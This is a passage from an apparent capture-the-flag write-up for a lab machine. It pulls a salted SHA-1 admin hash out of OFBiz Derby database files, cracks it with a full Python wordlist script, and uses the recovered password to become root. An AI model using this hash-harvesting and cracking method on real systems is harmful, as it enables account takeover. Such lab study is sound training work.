</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>   #########################################################################
</span></span></span><span class=line><span class=cl><span class=go>   #     __  __                     __           ______    _____           #
</span></span></span><span class=line><span class=cl><span class=go>   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
</span></span></span><span class=line><span class=cl><span class=go>   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
</span></span></span><span class=line><span class=cl><span class=go>   #     \ \  _  \  /&#39;__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
</span></span></span><span class=line><span class=cl><span class=go>   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
</span></span></span><span class=line><span class=cl><span class=go>   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
</span></span></span><span class=line><span class=cl><span class=go>   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
</span></span></span><span class=line><span class=cl><span class=go>   #                                                             By Zion3R #
</span></span></span><span class=line><span class=cl><span class=go>   #                                                    www.Blackploit.com #
</span></span></span><span class=line><span class=cl><span class=go>   #                                                   Root@Blackploit.com #
</span></span></span><span class=line><span class=cl><span class=go>   #########################################################################
</span></span></span><span class=line><span class=cl><span class=go>--------------------------------------------------
</span></span></span><span class=line><span class=cl><span class=go> HASH: 47ca69ebb4bdc9ae0adec130880165d2cc05db1a
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Possible Hashs:
</span></span></span><span class=line><span class=cl><span class=go>[+] SHA-1
</span></span></span><span class=line><span class=cl><span class=go>[+] MySQL5 - SHA-1(SHA-1($pass))
</span></span></span></code></pre></div><p>However, attempting a <code>Brute Force Password Cracking</code> does not work for this hash.</p><ul><li>I start looking for more <code>SHA</code> hashes with <code>grep</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>ofbiz@bizness:/opt/ofbiz$ grep -rE &#39;\$SHA&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>grep: runtime/data/derby/ofbiz/seg0/c54d0.dat: binary file matches
</span></span></span><span class=line><span class=cl><span class=go>grep: runtime/data/derby/ofbiz/seg0/c6650.dat: binary file matches
</span></span></span><span class=line><span class=cl><span class=go>grep: .gradle/5.0-rc-5/javaCompile/classAnalysis.bin: binary file matches
</span></span></span><span class=line><span class=cl><span class=go>grep: build/distributions/ofbiz.tar: binary file matches
</span></span></span><span class=line><span class=cl><span class=go>gradle/init-gradle-wrapper.sh:        echo &#34;$SHASUM_GRADLE_WRAPPER_FILES&#34; | shasum -c -;
</span></span></span><span class=line><span class=cl><span class=go>docker/docker-entrypoint.sh:    SHA1SUM_ESCAPED_STRING=$(printf &#34;$SHA1SUM_ASCII_HEX&#34; | sed -e &#39;s/\(..\)\.\?/\\x\1/g&#39;)
</span></span></span><span class=line><span class=cl><span class=go>docker/docker-entrypoint.sh:    SHA1SUM_BASE64=$(printf &#34;$SHA1SUM_ESCAPED_STRING&#34; | basenc --base64url --wrap=0 | tr --delete &#39;=&#39;)
</span></span></span><span class=line><span class=cl><span class=go>docker/docker-entrypoint.sh:    ENCODED_PASSWORD_HASH=&#34;\$SHA\$${SALT}\$${SHA1SUM_BASE64}&#34;
</span></span></span></code></pre></div><ul><li>Checking the first 2 files where the string <code>$SHA</code> was found with <code>strings</code> shows:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>ofbiz@bizness:/opt/ofbiz$ strings runtime/data/derby/ofbiz/seg0/c6650.dat
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>system
</span></span></span><span class=line><span class=cl><span class=go>&amp;6)]
</span></span></span><span class=line><span class=cl><span class=go>system
</span></span></span><span class=line><span class=cl><span class=go>        anonymous
</span></span></span><span class=line><span class=cl><span class=go>admin
</span></span></span><span class=line><span class=cl><span class=go>&#34;$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
</span></span></span></code></pre></div><p>and</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>ofbiz@bizness:/opt/ofbiz$ strings runtime/data/derby/ofbiz/seg0/c54d0.dat
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>8501
</span></span></span><span class=line><span class=cl><span class=go>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
</span></span></span><span class=line><span class=cl><span class=go>            &lt;ofbiz-ser&gt;
</span></span></span><span class=line><span class=cl><span class=go>                &lt;map-HashMap&gt;
</span></span></span><span class=line><span class=cl><span class=go>                    &lt;map-Entry&gt;
</span></span></span><span class=line><span class=cl><span class=go>                        &lt;map-Key&gt;
</span></span></span><span class=line><span class=cl><span class=go>                            &lt;std-String value=&#34;recurrenceInfoId&#34;/&gt;
</span></span></span><span class=line><span class=cl><span class=go>                        &lt;/map-Key&gt;
</span></span></span><span class=line><span class=cl><span class=go>                        &lt;map-Value&gt;
</span></span></span><span class=line><span class=cl><span class=go>                            &lt;std-String value=&#34;400&#34;/&gt;
</span></span></span><span class=line><span class=cl><span class=go>                        &lt;/map-Value&gt;
</span></span></span><span class=line><span class=cl><span class=go>                    &lt;/map-Entry&gt;
</span></span></span><span class=line><span class=cl><span class=go>                &lt;/map-HashMap&gt;
</span></span></span><span class=line><span class=cl><span class=go>            &lt;/ofbiz-ser&gt;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>10000
</span></span></span><span class=line><span class=cl><span class=go>J&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;ofbiz-ser&gt;
</span></span></span><span class=line><span class=cl><span class=go>    &lt;map-HashMap&gt;
</span></span></span><span class=line><span class=cl><span class=go>        &lt;map-Entry&gt;
</span></span></span><span class=line><span class=cl><span class=go>            &lt;map-Key&gt;
</span></span></span><span class=line><span class=cl><span class=go>                &lt;std-String value=&#34;updatedUserLogin&#34;/&gt;
</span></span></span><span class=line><span class=cl><span class=go>            &lt;/map-Key&gt;
</span></span></span><span class=line><span class=cl><span class=go>            &lt;map-Value&gt;
</span></span></span><span class=line><span class=cl><span class=go>                &lt;eeval-UserLogin createdStamp=&#34;2023-12-16 03:40:23.643&#34; createdTxStamp=&#34;2023-12-16 03:40:23.445&#34; currentPassword=&#34;$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I&#34; enabled=&#34;Y&#34; hasLoggedOut=&#34;N&#34; lastUpdatedStamp=&#34;2023-12-16 03:44:54.272&#34; lastUpdatedTxStamp=&#34;2023-12-16 03:44:54.213&#34; requirePasswordChange=&#34;N&#34; userLoginId=&#34;admin&#34;/&gt;
</span></span></span><span class=line><span class=cl><span class=go>            &lt;/map-Value&gt;
</span></span></span><span class=line><span class=cl><span class=go>        &lt;/map-Entry&gt;
</span></span></span><span class=line><span class=cl><span class=go>        &lt;map-Entry&gt;
</span></span></span><span class=line><span class=cl><span class=go>            &lt;map-Key&gt;
</span></span></span><span class=line><span class=cl><span class=go>                &lt;std-String value=&#34;locale&#34;/&gt;
</span></span></span><span class=line><span class=cl><span class=go>            &lt;/map-Key&gt;
</span></span></span><span class=line><span class=cl><span class=go>            &lt;map-Value&gt;
</span></span></span><span class=line><span class=cl><span class=go>                &lt;std-Locale value=&#34;en&#34;/&gt;
</span></span></span><span class=line><span class=cl><span class=go>            &lt;/map-Value&gt;
</span></span></span><span class=line><span class=cl><span class=go>        &lt;/map-Entry&gt;
</span></span></span><span class=line><span class=cl><span class=go>    &lt;/map-HashMap&gt;
</span></span></span><span class=line><span class=cl><span class=go>&lt;/ofbiz-ser&gt;
</span></span></span></code></pre></div><p>where we have another hash: <code>$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I</code>. Where <code>d</code> is the &ldquo;salt&rdquo; for the hash.</p><ul><li>We create a simple <code>Python</code> script that requires a salt, a hash and a wordlist. In our case we have the salt <code>d</code>, the hash <code>uP0_QaVBpDWFeo8-dRzDqRwXQ2I=</code> (adding a <code>=</code> char at the end of it) and use the wordlist/dictionary <code>rockyou</code> (which can be downloaded <a href=https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt class=external-link target=_blank rel=noopener>from this link</a>). Our script is:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/python3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>argparse</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>percentage</span><span class=p>(</span><span class=n>number</span><span class=p>:</span> <span class=nb>int</span><span class=p>,</span> <span class=n>total</span><span class=p>:</span> <span class=nb>int</span><span class=p>)</span><span class=o>-&gt;</span><span class=nb>float</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=n>number</span><span class=o>/</span><span class=n>total</span><span class=p>)</span> <span class=o>*</span> <span class=mf>100.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>total_line_lengths</span><span class=p>(</span><span class=n>file_path</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span><span class=o>-&gt;</span><span class=nb>int</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>total_length</span><span class=p>:</span> <span class=nb>int</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>file_path</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>,</span> <span class=n>encoding</span><span class=o>=</span><span class=s1>&#39;latin-1&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>file</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>line</span> <span class=ow>in</span> <span class=n>file</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>total_length</span> <span class=o>+=</span> <span class=nb>len</span><span class=p>(</span><span class=n>line</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>total_length</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>crypt_password</span><span class=p>(</span><span class=n>salt</span><span class=p>,</span> <span class=n>password</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>sha1</span><span class=p>((</span><span class=n>salt</span> <span class=o>+</span> <span class=n>password</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>crack_password</span><span class=p>(</span><span class=n>salt</span><span class=p>:</span> <span class=nb>str</span><span class=p>,</span> <span class=nb>hash</span><span class=p>:</span> <span class=nb>str</span><span class=p>,</span> <span class=n>wordlist</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span><span class=o>-&gt;</span><span class=nb>str</span><span class=o>|</span><span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>total_lines</span> <span class=o>=</span> <span class=n>total_line_lengths</span><span class=p>(</span><span class=n>wordlist</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>wordlist</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>,</span> <span class=n>encoding</span><span class=o>=</span><span class=s1>&#39;latin-1&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>index</span><span class=p>,</span> <span class=n>password</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>f</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>password</span> <span class=o>=</span> <span class=n>password</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>hashed_password</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>urlsafe_b64encode</span><span class=p>(</span><span class=n>crypt_password</span><span class=p>(</span><span class=n>salt</span><span class=p>,</span> <span class=n>password</span><span class=p>))</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;+&#39;</span><span class=p>,</span> <span class=s1>&#39;.&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] Attempting to crack password... (</span><span class=si>{</span><span class=n>index</span><span class=o>+</span><span class=mi>1</span><span class=si>}</span><span class=s2>/</span><span class=si>{</span><span class=n>total_lines</span><span class=si>}</span><span class=s2> - </span><span class=si>{</span><span class=n>percentage</span><span class=p>(</span><span class=n>index</span><span class=o>+</span><span class=mi>1</span><span class=p>,</span> <span class=n>total_lines</span><span class=p>)</span><span class=si>:</span><span class=s2>.2f</span><span class=si>}</span><span class=s2>%)&#34;</span><span class=p>,</span> <span class=n>end</span><span class=o>=</span><span class=s2>&#34;</span><span class=se>\r</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>hashed_password</span> <span class=o>==</span> <span class=nb>hash</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>()</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>password</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>parse_arguments</span><span class=p>()</span><span class=o>-&gt;</span><span class=n>argparse</span><span class=o>.</span><span class=n>Namespace</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=c1># Parse command line arguments</span>
</span></span><span class=line><span class=cl>    <span class=n>parser</span> <span class=o>=</span> <span class=n>argparse</span><span class=o>.</span><span class=n>ArgumentParser</span><span class=p>(</span><span class=n>description</span><span class=o>=</span><span class=s1>&#39;Crack SHA-1 hashed password&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                                     <span class=n>epilog</span><span class=o>=</span><span class=sa>f</span><span class=s1>&#39;Example usage:python3 </span><span class=si>{</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=si>}</span><span class=s1> --salt &#34;d&#34; --hash &#34;&lt;SHA1-hash&gt;&#34; --wordlist &#34;/usr/share/wordlists/rockyou.txt&#34;&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                                     <span class=n>formatter_class</span><span class=o>=</span><span class=n>argparse</span><span class=o>.</span><span class=n>RawTextHelpFormatter</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>&#39;--sha1&#39;</span><span class=p>,</span> <span class=nb>type</span><span class=o>=</span><span class=nb>str</span><span class=p>,</span> <span class=n>help</span><span class=o>=</span><span class=s1>&#39;SHA-1 hash to crack&#39;</span><span class=p>,</span> <span class=n>required</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>&#39;--salt&#39;</span><span class=p>,</span> <span class=nb>type</span><span class=o>=</span><span class=nb>str</span><span class=p>,</span> <span class=n>help</span><span class=o>=</span><span class=s1>&#39;Hash salt&#39;</span><span class=p>,</span> <span class=n>required</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>&#39;--wordlist&#39;</span><span class=p>,</span> <span class=nb>type</span><span class=o>=</span><span class=nb>str</span><span class=p>,</span> <span class=n>help</span><span class=o>=</span><span class=s1>&#39;Dictionary to attempt to crack password&#39;</span><span class=p>,</span> <span class=n>required</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>args</span> <span class=o>=</span> <span class=n>parser</span><span class=o>.</span><span class=n>parse_args</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>args</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>()</span><span class=o>-&gt;</span><span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=c1># Get arguments from user</span>
</span></span><span class=line><span class=cl>    <span class=n>args</span> <span class=o>=</span> <span class=n>parse_arguments</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=c1># Attempt to crack the password</span>
</span></span><span class=line><span class=cl>    <span class=n>password</span> <span class=o>=</span> <span class=n>crack_password</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>salt</span><span class=p>,</span> <span class=n>args</span><span class=o>.</span><span class=n>sha1</span><span class=p>,</span> <span class=n>args</span><span class=o>.</span><span class=n>wordlist</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># And display the result (if there is a result)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>password</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] Password found: </span><span class=si>{</span><span class=n>password</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[!] Could not find a password&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
</span></span></code></pre></div><p>and running it we get:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 sha1_decryptor.py --sha1 &#39;uP0_QaVBpDWFeo8-dRzDqRwXQ2I=&#39; --salt &#39;d&#39; --wordlist &#39;/usr/share/wordlists/rockyou.txt&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] Attempting to crack password... (1478438/139921507 - 1.06%)
</span></span></span><span class=line><span class=cl><span class=go>[+] Password found: monkeybizness
</span></span></span></code></pre></div><p>so we have a password: <code>monkeybizness</code></p><ul><li>From the terminal inside the target machine we can then just try to change to <code>root</code> user running <code>su root</code> and provide the password <code>monkeybizness</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>ofbiz@bizness:/opt/ofbiz$ su root
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Password:
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>root@bizness:/opt/ofbiz# whoami
</span></span></span><span class=line><span class=cl><span class=go>root
</span></span></span></code></pre></div><p>And we are done. We can read the <code>root</code> flag at <code>/root</code> directory.</p></div><footer></footer></article></section></div><footer class=footer><section class=container>¬©
2023 -
2024
gunzf0x
¬∑
Powered by <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>